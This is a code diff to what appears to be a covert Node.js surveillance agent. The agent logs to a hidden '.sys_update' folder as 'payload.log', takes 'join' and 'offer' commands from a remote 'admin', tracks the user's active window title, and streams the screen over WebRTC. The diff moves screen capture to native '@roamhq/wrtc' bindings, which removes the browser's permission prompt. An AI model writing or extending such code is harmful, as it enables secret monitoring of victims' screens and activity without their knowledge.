@@ -7,6 +7,19 @@ const https = require('https');
 const crypto = require('crypto');
 const http = require('http'); 
 
+// --- NATIVE WEBRTC IMPORTS ---
+let wrtc;
+try {
+    wrtc = require('@roamhq/wrtc');
+} catch (e) {
+    console.error("Failed to load @roamhq/wrtc. Ensure it is installed.");
+}
+
+const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
+
+// If @roamhq/wrtc isn't loaded, fallback to basic logic (but video won't work without it)
+const HAS_WEBRTC = !!wrtc;
+
 // --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
@@ -96,7 +109,7 @@ function initConnection() {
  log(`[JOIN] Request join received from ${data.from}`);
  handleJoinRequest(data.from);
  } else if (data.type === 'start_join') {
- // NEW: Explicitly start the join process when requested by admin
+ // Explicitly start the join process when requested by admin
  log(`[JOIN] Starting join initiated by ${data.from}`);
  handleJoinRequest(data.from);
  } else if (data.type === 'offer') {
@@ -171,16 +184,24 @@ function startMonitoring() {
  }, 5000);
 }
 
-// --- WEBRTC FUNCTIONS ---
-
+// --- NATIVE SCREEN CAPTURE FUNCTION ---
 async function setupLocalStream() {
  if (localStream) return localStream;
+ 
+ if (!HAS_WEBRTC) {
+ log("[WEBRTC] Native WebRTC module missing!");
+ return null;
+ }
+
  try {
- log("[WEBRTC] Requesting screen access...");
- localStream = await navigator.mediaDevices.getDisplayMedia({
+ log("[WEBRTC] Capturing screen via native bindings...");
+ 
+ // Use native mediaDevices to get display stream
+ localStream = await mediaDevices.getDisplayMedia({
  video: { cursor: "always" },
  audio: false
  });
+ 
  log("[WEBRTC] Screen access granted");
  
  localStream.getVideoTracks()[0].onended = () => {
@@ -319,6 +340,7 @@ async function getCurrentWindowTitle() {
  } else if (platform === 'darwin') {
  cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
  } else {
+ // Removed generic linux fallback that was causing issues
  cmd = 'xdotool getwindowfocus getwindowname';
  }
  exec(cmd, (err, stdout) => {
